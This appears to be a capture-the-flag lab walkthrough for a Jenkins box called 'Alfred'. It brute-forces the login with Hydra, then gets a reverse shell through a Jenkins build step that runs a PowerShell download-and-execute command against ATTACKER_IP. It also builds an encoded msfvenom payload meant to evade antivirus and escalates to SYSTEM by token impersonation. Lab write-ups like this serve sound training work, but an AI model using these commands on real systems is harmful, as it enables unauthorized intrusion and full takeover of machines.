# Alfred (Jenkins)

### **Alfred** <a href="#id-7qprldl4ptlr" id="id-7qprldl4ptlr"></a>

* Exploit a common misconfiguration on a widely used automation server (Jenkins).
  * Jenkins is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it).
* Use an interesting privilege escalation method to get full system access.

### **Initial Access** <a href="#g1aemj3nk81z" id="g1aemj3nk81z"></a>

#### **nmap scan to determine open TCP ports.** <a href="#id-7sq96egofnjf" id="id-7sq96egofnjf"></a>

nmap -sT -sV -p- -oN TARGET\_IP\_scan.nmap TARGET\_IP

Not shown: 65532 filtered ports

PORT STATE SERVICE VERSION

80/tcp open http Microsoft IIS httpd 7.5

3389/tcp open ms-wbt-server Microsoft Terminal Service

8080/tcp open http Jetty 9.4.z-SNAPSHOT

#### **Identify username and password for login panel.** <a href="#ywx2fvfwn15y" id="ywx2fvfwn15y"></a>

It always is good practice to Google for default credentials before attempting any brute force attack. This will save a huge amount of time.

**1. Send login attempt via Burpsuite**

* Target > Project > Scope > Include "http://TARGET\_IP:8080" in scope.
* Ensure **Intercept** is on.
* Open inbuilt Chromium browser to intercept requests.
* Proxy any username and password via login panel.
* Forward request to **Repeater**.
* **Send** to see the response.

**2. Brutefore login panel using Hydra**

* Login or Wordlist for Usernames = /usr/share/wordlists/rockyou.txt.
* Password or Wordlist for Passwords = /usr/share/wordlists/rockyou.txt.
* IP address or Hostname = TARGET\_IP.
* HTTP Method (POST/GET) = http-form-post.
  * **Inspect Element** in browser.
  * **Network** tab of developer tools.
  * Attempt a login.
  * GET or POST Method displayed in request.

POST /j\_acegi\_security\_check HTTP/1.1

* Directory/Path to the Login Page = /j\_acegi\_security\_check.
  * Request header "Filename" attribute.

/j\_acegi\_security\_check

* Request Body for Username/Password = j\_username=^USER^\&j\_password=^PASS^\&from=%2F\&Submit=Sign+in
  * **Inspect Element** in browser.
  * **Network** tab of developer tools.
  * Attempt a login.
  * Right click on request > **Edit and Resend**.
  * **Request Body** contains entered username and password.
  * Grab entire request.

j\_username=12345\&j\_password=12345\&from=%2F\&Submit=Sign+in

* Replace entered username with \`^USER^ to tell Hydra to enter words from wordlist in this position of the request.
* Replace entered password with ^PASS^.
* Way to Identify Failed Attempts = Invalid username or password.
  * Attempt to login using incorrect credentials.
  * Presented with "Invalid username or password" text.
  * Add this to Hydra command.

hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt TARGET\_IP -s 8080 http-form-post "/j\_acegi\_security\_check:j\_username=^USER^\&j\_password=^PASS^:Invalid username or password"

* Hydra bruteforces login and returns credentials.

\[8080]\[http-post-form] host: TARGET\_IP login: Admin password: admin

\[8080]\[http-post-form] host: TARGET\_IP login: admin password: admin

1 of 1 target successfully completed, 2 valid passwords found

#### **Use feature of Jenkins server to get reverse shell.** <a href="#acclky61yhf7" id="acclky61yhf7"></a>

**1. Jenkins project Command field allows execution of commands on underlying system**

* **Job** > **Project** > **Configure**.
* **Build** section has text field where Windows commands are executed.

**2. Add PowerShell to exploitable field**

powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER\_IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER\_IP -Port 1234

* PowerShell script connects to standard netcat listening port when using "-Reverse" switch.
* **Save** project.

**3. Clone Nishang powershell scripts from GitHub**

mkdir tools

cd tools

git clone https://github.com/samratashok/nishang/

cd nishang/Shells

**4. Create http server to serve Nishang Invoke-PowerShellTcp script**

python3 -m http.server

**5. Create listener to catch the reverse shell**

nc -lvnp 1234

**6. Use Jenkins feature to download and run Nishang script**

* **Build Now** feature executes saved PowerShell.
* PowerShell uploaded to target.

TARGET\_IP - - \[23/Feb/2024 15:27:19] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

**7. Reverse shell caught by listener**

Connection from TARGET\_IP 49253 received!

Windows PowerShell running as user bruce on ALFRED

Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>whoami

alfred\bruce

* "user.txt" is located in "C:\users\bruce\desktop" directory.

### **Switching shells** <a href="#j8aakoce5aww" id="j8aakoce5aww"></a>

* Switch to meterpreter shell to make privilege escalation easier.

**1. Use msfvenom to create meterpreter reverse shell.**

* Payload generated is encoded x86-64 reverse TCP payload.
  * Encoding used to evade AV products.

msfvenom -p windows/meterpreter/reverse\_tcp -a x86 --encoder x86/shikata\_ga\_nai lhost=ATTACKER\_IP lport=2345 -f exe -o reverse\_shell.exe

**2. Create http server to serve payload.**

* Ensure HTTP server is running from the directory where "reverse\_shell.exe" is located.

python3 -m http.server

**3. Download payload to target.**

powershell "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER\_IP:8000/reverse\_shell.exe','reverse\_shell.exe')"

**3. Verify handler is set up in Metasploit.**

* Use Metasploit handler to receive incoming connection from reverse shell.

msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse\_tcp

set lhost ATTACKER\_IP

set lport 2345

exploit

**4. Start reverse shell on target.**

start-process "reverse\_shell.exe"

**5. Meterpreter reverse shell spawned.**

\[\*] Meterpreter session 1 opened (ATTACKER\_IP:2345 -> TARGET\_IP:49297) at 2024-02-23 17:50:15 +0000

getuid

Server username: alfred\bruce

### **Privilege escalation** <a href="#id-7enly4usj4o2" id="id-7enly4usj4o2"></a>

* Windows uses account tokens to ensure accounts have the right privileges to carry out particular tasks.
* Tokens assigned when users log in or are authenticated.
* Usually done by **LSASS.exe** (authentication process).
* Access token contents.
  * **User SIDs** (security identifiers).
  * **Group SIDs**.
  * **Privileges**.
* [More detailed access token information](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).
* Two types of access tokens.
  * **Primary access tokens**.
    * Generated upon logon and associated with a user account.
  * **Impersonation tokens**.
    * Allows particular process (or thread) to gain access to resources using token of another process.
    * Four different levels.
      * SecurityAnonymous.
        * Current user/client cannot impersonate another user/client.
      * SecurityIdentification.
        * Current user/client can get identity and privileges of client but cannot impersonate client.
      * SecurityImpersonation.
        * Current user/client can impersonate client's security context on local system.
      * SecurityDelegation.
        * Current user/client can impersonate client's security context on remote system.
  * Security context is data structure containing users' relevant security information.
* Privileges of an account allow the user to carry out particular actions.
* Commonly abused privileges.
  * SeImpersonatePrivilege.
  * SeAssignPrimaryPrivilege.
  * SeTcbPrivilege.
  * SeBackupPrivilege.
  * SeRestorePrivilege.
  * SeCreateTokenPrivilege.
  * SeLoadDriverPrivilege.
  * SeTakeOwnershipPrivilege.
  * SeDebugPrivilege.
* [Abusing Token Privileges For LPE](https://www.exploit-db.com/papers/42556).

**1. Display all privileges.**

whoami /priv

* SeDebugPrivilege and SeImpersonatePrivilege privileges are enabled.
* load incognito loads Metasploit's incognito module to exploit vulnerability.
* list\_tokens -g checks which tokens are available.
  * "BUILTIN\Administrators" token is available.

**2. Impersonate Administrators' token.**

impersonate\_token "BUILTIN\Administrators"

\[-] Warning: Not currently running as SYSTEM, not all tokens will be available

Call rev2self if primary process token is SYSTEM

\[+] Delegation token available

\[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

* Windows uses Primary Token of any process and not impersonated token to determine what process can do.

**3. Migrate to "services.exe" process.**

* This runs with "NT AUTHORITY\SYSTEM" permissions.

ps

\[...snip...]

668 580 services.exe x64 0 NT AUTHORITY\SYSTEM C:\Windows\System32\services.exe

\[...snip...]

migrate 668

\[\*] Migrating from 1872 to 668...

\[\*] Migration completed successfully.

getuid

Server username: NT AUTHORITY\SYSTEM
